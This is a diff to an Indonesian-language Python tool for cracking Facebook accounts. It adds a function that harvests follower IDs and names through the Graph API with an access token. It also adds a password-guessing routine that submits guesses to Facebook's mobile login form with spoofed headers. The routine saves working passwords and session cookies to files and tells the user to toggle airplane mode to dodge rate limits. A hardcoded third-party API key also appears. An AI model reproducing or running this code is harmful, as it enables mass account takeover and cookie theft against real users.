@@ -559,7 +559,7 @@ def menu(my_name,my_id):
     elif HaHi in ['2','02']:
         massal()
     elif HaHi in ['3','03']:
-        pengikut2()
+        follower()
     elif HaHi in ['4','04']:
         clon_email()
     elif HaHi in ['5','05']:
@@ -582,6 +582,35 @@ def menu(my_name,my_id):
 
 
 
+def follower():
+    try:
+        token = open('.token.txt', 'r').read()
+    except IOError:
+        exit()
+    win = '# DUMP ID DARI FOLLOWER'
+    win2 = mark(win, style='cyan')
+    sol().print(win2)
+    print(x + '[' + h + '•' + x + '] Ketik "me" Jika Ingin Dari Follower Mu')
+    pili = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
+    try:
+        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
+        for pi in koh2['subscribers']['data']:
+            try:
+                id.append(pi['id'] + '|' + pi['name'])
+            except:
+                continue
+        print(x + '[' + h + '•' + x + '] Total : ' + str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+        lo = mark(li, style='red')
+        sol().print(lo, style='cyan')
+        exit()
+    except (KeyError, IOError):
+        teks = '# FOLLOWER TIDAK PUBLIK ATAU TOKEN RUSAK'
+        teks2 = mark(teks, style='red')
+        sol().print(teks2)
+        exit()
 ##------------[Crack File]------------##
 def crack_file():
 	try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
@@ -1082,7 +1111,7 @@ def passwrd():
     urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
     wa.print(Columns(urut))
     awal = datetime.now()
-    Console().print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi",width=80,style=f"{color_panel}"))
+    Console().print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold green]Informasi",width=80,style=f"{color_panel}"))
     prog = Progress(TextColumn('{task.description}'))
     des = prog.add_task('',total=len(id2))
     with prog:
@@ -1117,7 +1146,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(mbasic,idf,pwv)
+                pool.submit(reguler,idf,pwv)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1164,8 +1193,72 @@ def mbasic(idf,pwv):
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
+ 
+
 #--------------------[ METODE reguler ]-----------------#
-def reguler(idf,pwv,awal):
+def reguler(idf,pwv):
+	global loop,ok,cp
+	rr = random.randint
+	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	ua = random.choice(free)
+	ses = requests.Session()
+	for pw in pwv:
+		pw = pw.lower()
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
+			data = {
+'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+'try_number': 0,
+'unrecognized_tries': 0,
+'email':idf,
+'pass':pw,
+'login':'Masuk',
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': False,
+'had_password_prefilled': False,
+'is_smart_lock': False,
+'bi_xrwh': 0
+}
+			headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				cp+=1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio o.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				
+				break
+			else:continue
+		except requests.exceptions.ConnectionError:time.sleep(31)
+	loop+=1
+    
+#--------------------[ METODE reguler ]-----------------#
+def regulerr(idf,pwv,awal):
 	global loop,ok,cp
 	rr = random.randint
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
@@ -1586,15 +1679,9 @@ def mengecek(user,pw):
 		prints(tree)
 		  
 def scarpping_ua():
-    
-    
     uascrap = []
     url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
     header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
-    
-    
-    
- 
     try:
         response = requests.get(url,headers=header)
         if response.status_code == 200:
@@ -2463,4 +2550,4 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	maintenance()
+	login()
